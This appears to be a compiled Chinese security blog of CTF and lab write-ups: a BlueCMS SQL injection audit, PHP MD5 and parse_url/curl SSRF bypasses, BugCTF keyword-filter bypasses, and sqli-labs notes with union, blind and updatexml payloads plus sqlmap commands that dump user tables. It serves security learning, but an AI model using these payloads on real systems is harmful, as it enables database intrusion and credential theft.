ad_js.php-SQL注入漏洞

首先第一个也就是最多被人提及的注入漏洞了,这个是直接Seay自动审计就可以审计出来的(大多数时候不要相信这个玩意儿) 然后就看到了这一串代码,这段代码只是简单的对ip参数进行了去除首位空白符的操作,并没有对用户输入进行过滤,table()函数只是为表名加上了'blue_'的前缀,而getone()函数则是将sql语句传过去,进行查询并没有进行过滤,但开头应用了一个common.inc.php,我们去看看是不是配置了什么其他过滤设置. 这里定义了如果魔术引号没有使用的话,将会对全局变量$_POST,$_GET,$_COOKIE,$_REQUEST调用deep_addslashe()函数,然后我们再去看看deep_addslashe()这个函数长什么样 我们发现这个函数将利用递归,将数组内的所有内容全部使用了addslashe()函数--即对输入中的引号加上'/'就像下面的官方手册范例一样 经由测试,魔术引号是没有打开的也就是说,我们通过GET,POST,COOKIE传进来的数据中的引号都会被加上下划线,然后注意看原来ad_js.php的sql语句,发现了吗?这是数字型的注入,也就是说我们并不需要使用引号去闭合前面的语句,因此存在注入,那么是否有回显呢?注意下方的语句: 这条语句实际上起的作用是,如果查询成功则将查询的结果,以html注释的形式回显出来,然而出现查询错误,则会完整的将查询语句回显出来(非注释)如下图: 由于是数字型注入,且有回显因此这里可以使用union联合查询注入,过程如下图: 前面已经使用order...by语句查询到了有7个列,因此接下来检查回显: 然后爆表名: 随后爆列名(这里需要注意的是由于deep_addslashe()函数的存在,这里如果使用表名加引号会自动被加上'/',导致查询失败,因此需要进行16进制编码绕过: 最后回显admin用户的信息:

ip伪造sql注入

首先阅读配置文件的时候,发现了一个问题,就是前文提及的对全局变量过滤的函数,实际上忽略了$_SERVER和$_FILES这两个全局变量,也就以为则,这两个超级变量的引用将不会有任何的处理,而根据getip()函数,表明服务器获得ip的方式既可以使用X-Forwarded-for来伪造,也可以使用client-ip来伪造,两者皆可. 既然猜测在使用ip的时候没有进行数据处理,那么可以通过全局搜索调用getip()的地方,来寻找是否有注入点的地方,如下图: 阅读这个insert语句,发现其中的变量在前后并没有过滤,或者说对getip()函数返回的结果没有进行过滤,因此这里存在注入,具体利用方式参照 blueCMSsql注入

博客中的payload,思路就是闭合前一个VALUE(),再构造下一个(),这里如果输入错误的sql语句会将sql语句全部回显出来,因为这个INSERT注入会涉及很多参数,而除了回显点,都需要和前一个VALUE()保持一致.

PS:这里有个小坑的地方,回显语句后面的哪个参数是时间戳,也就是注入之后,回显的评论时候是由注入语句后那个参数决定了,之前按照上面博客的语句,注入的数据在最下面(时间为1970年).

    第一二个if的绕过

    先看第一个if要求str1和str2不相等,这个可以轻易绕过，主要 就是第二个if要求str1和str2的MD5值相等，注意是"=!"也就是弱相等，因此我们可以构造md5值为0e开头的，php在读入X（X是数字）e开头的字符会理解为X的多少次方， 因此0E开头，可以理解为0的多少次方，我们知道0^n无论如何还是0，所以就能够绕过第二个if了。 这里构造参数 
    str1=s878926199a str2=s155964671a

    第三四个if的绕过

    我们看到第三个if仍然是相同的套路，但这时MD5值得校验已经变成了强相等，这时候不能再用之前得方法绕过了，我们可以用数组进行绕过，由于如果在MD5里面传入 数组的话，那么MD5函数会返回一个NULL，由于两边都是NULL，所以就可以绕过这个强相等问题了。 
    str3[]=1 str4[]=2
    因为这种写法会使php的参数变成error，而两个参数均为error转换为MD5后值一定相同。

    第五六七个if绕过

    $_SERVER["QUERY_STRING"]这个在PHP中等同于查询字符"?"后的所有字符，因此第五个if要求H_game字符不能在"?"后面出现，但由于$str5 = @$_GET['H_game']; 也就是说我们必须传入h_game参数，并且要是数字，而且不能满足后面两个if，即又要>=9999999999，转化为字符后又必须<=0。 一步一步来，先绕过校验h_game存在，这里可以利用url编码进行绕过，轻轻松松。而后面两个if也可以用数组进行绕过="" 最后h_game参数就直接变成了="" %48%5f%67%61%6d%65[]=%20

    第八九十个if绕过

    curl的处理

    curl在这里相当于解析我们的url并进行访问，但注意curl的访问，相当于在服务器内部进行的访问，也就是说如果我们访问本地的文件，就相当于以localhost去访问本地 资源，因此要想办法让curl解析访问admin.php，这里就要利用URL的组成了，首先parse_url（）在解析host时，会解析第二个@后面的内容，而CURL则会解析第一个@后的内容 有关curl是个啥 因此这里构造参数 
    url=http://@127.0.0.1:80@www.baidu.com/admin.php
    便可以成功访问admin.php了，但不知道为什么直接用127.0.0.1不能直接访问需要加个80端口。

    第一次sql注入

    最近一直在做BugCTF web的题，今天遇到了十分涨姿势的一道SQL注入，就是多次了。 这道题一进去看到一个?id=1就猜测多半存在sql注入了，但是在id后面输入'，页面报错，大致可以确定存在sql注入了，然后按照一般sql注入的步骤去操作， 测试了两组payload，都是报错界面（后面的一个-其实都是两个-号） 
    id=1'+or+1=1--+
    id=1'+order+by+2--+
    于是判断该题可能过滤了一些关键词，下面使用新姿势来测试究竟过滤了哪些关键词--异或法 （sql中的异或符号为^，在该符号两侧的表达式均为真或均为假时，会返回假，其余情况返回真，于是使用该方法来判断过滤的关键词） 
    id=1'^(length("or")!=0)--+
    返回了正常界面，由于已经验证过表达式id=1为真，根据异或的真值规则可以判断出只有后面的式子为假，而后面表达式的意思为判断or字符的长度为几,length() 会返回字符长度，由于sql里面0=False，所以后面这句表达式在于判断or字符是否为0，也就是是不是被过滤了掉了，由返回结果可以判断出or字符确实是被过滤掉了， 通过这种方法类似的，我们可以判断select union and 关键词都被过滤掉了，其它的关键词如union回显注入里面存在的table column schema where都未被过滤掉，下面 就开始注入了，可以透过双写的方式绕过关键词过滤， 查字段数：(这里只是or被过滤掉了，只需要双写or即可) 
    id=1'+oorrder+by+2--+
    字段数为2，然后构造union查询注入，当然我们需要确定回显字段， 
    id=x'+ununionion+seselectlect+1,2--+
    随后爆表名： 
    id=x'+ununionion+seselectlect+1,group_concat(table_name)+from+infoorrmation_schema.tables+where+table_schema=database()--+
    爆列名： 
    id=x'+ununionion+seselectlect+1,group_concat(column_name)+from+infoorrmation_schema.columns+where+table_name='flag1'--+
    爆值： flag1为： 
    id=x'+ununionion+seselectlect+1,group_concat(flag1)+from+flag1--+
    然而flag并不是这个，转头去爆address的值 
    id=x'+ununionion+seselectlect+1,group_concat(address)+from+flag1--+

    第二次sql注入

    点击进入了下一关又是一个sql注入，一样的id参数，而这次居然有sql的错误回显，但测试了一下union select注入似乎不可以 这次我们需要使用updatexml()函数的报错回显注入，需要了解该函数的可以自行百度，该函数一共有三个参数，总之第二个参数 似乎能和回显注入一样，能够执行，因此下面payload如下 爆表名： 
    id=1'and+updatexml(1,concat('*-',(select+group_concat(table_name)+from+information_schema.tables+where+table_schema=database()),'*-'),3)--+
    接着爆列名: 
    id=1'and+updatexml(1,concat('*-',(select+group_concat(column_name)+from+information_schema.columns+where+table_name='flag2'),'*-'),3)--+
    最后爆值找到flag： 
    id=1'and+updatexml(1,concat('*-',(select+flag2+from+flag2),'-*'),3)--+
    updatexml()感觉在这道题的报错注入里面更像式标识符 到此为止本题结束。

    sqli labs(1-5)小结

    发表于 2019-01-03 更新于 2019-02-22 分类于 web安全
    本文字数： 2.1k 阅读时长 ≈ 2 分钟

    sql注入是常见的漏洞类型之一，所以最近就来玩玩sql注入了，DVWA里面的可以先简单熟悉一下SQL注入的操作，然后就可以来刷sqli-labs的题了，
    磨练绕过技巧就靠这个玩意儿了。（注以下的一个减号其实是两个）

    PART 1（手工注入）

    先来看看sqli-labs第一题 首先测试可用参数id是什么类型的注入，我们先随便输入一个id=1，得到数据库里面的数据，也就是说这是最基本的回显sql注入。 
    id=1'
    这时候sql报错了，通过报错的提示，我们可以知道，这是一个字符型（‘’）的注入，因此，先将单引号放在那里闭合原有的参数，在用--+（+代替空格） 来闭合后面的单引号。 这时候sql语句就变成了 
    select * from users where id='1'[这里插入payload]--+'(省略)
    的这种结构，因此先用order by （数字）爆字段数这里测试结果为3，即我们要保证select语句中有三个参数.然后就是确定回显的参数是什么了，由前面 我们的输入id=1时回显了两行数据，可以知道有两个字段能够回显。 这时候我们用 
    id=1000'+union+select+1,2,3--+
    来判断回显参数，由结果可知后面两个参数能够回显，因此我们得到数据库的内容也主要从后面两个参数下手； 随后：爆表名 
    id=1000' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+
    接着：爆列名 
    id=1000' union select 1,group_concat(column_name),3 from information_schema.columns where table_name="users"--+
    最后：爆值 
    id=1000' union select 1,group_concat(username),group_concat(password) from users--+
    这就是第一道sqli-labs的思路和过程了,后面几道题的思路和方法都和第一道大同小异，区别只是可控参数的类型不一样，比如第二道的参数类型就是数字型， 这里提提第三道题，可控参数实际上是 
    id=('[GET的内容]')
    第四道题的闭合方式和第三道类似，只是需要将'改成"而已。其余的payload和第一道题类似，这里不一一赘述了。 第五道题开始就没有回显注入了，而是来到了SQL盲注的大门，我们按照回显注入的方式输入 
    id=1
    发现没有回显数据，而是一串字符，但是这道题还算良心用经典方法 
    id=1'
    发现还是'型的注入，这时候我们故意构造一个错误的语句，看看回显的是什么 
    id=1'+and+1=2--+
    id=1'and+'1'='2'--+
    以上都可以得到错误的结果，这个语句要求前后都为真时才会返回数据，故意构造错误的语句是为了构造布尔型盲注，输入上面的payload之后我们可以将这个界面 看作假，将输入id=1（YOU ARE IN.....）看作真，这样我们就可以判断我们输入的payload是否奏效了。下面演示猜解数据表名称（上图） 这样我们就可以得到数据库名称的首字符的ASCII码值是115也就是s，依次类推能够得到数据库的名称。相似的我们也可以构造时间延迟型盲注。 以上代码能够在第一个参数为真时，返回第二个参数（sleep(5)--休眠5秒） 为假时返回第三个参数（1）； 通过页面响应的时间我们就能够判断参数1是否成立，因此也可以采用这种方式进行数据库的猜解。但这样猜解太过麻烦了，因此我们需要用sqlmap这一神器进行自动 注入。

    首先先使用 
    python sqlmap.py -u "http://localhost/sql/Less-5/?id=1" -p "id" --current-db

    python sqlmap.py -u "http://localhost/sql/Less-5/?id=1" -p "id" -D security --tables

    python sqlmap.py -u "http://localhost/sql/Less-5/?id=1" -p "id" -D security -T users --columns
     得到列名，就可以开始查值了 最后我们来爆值 
    python sqlmap.py -u "http://localhost/sql/Less-5/?id=1" -p "id" -D security -T users -C "id,username,password" --dump
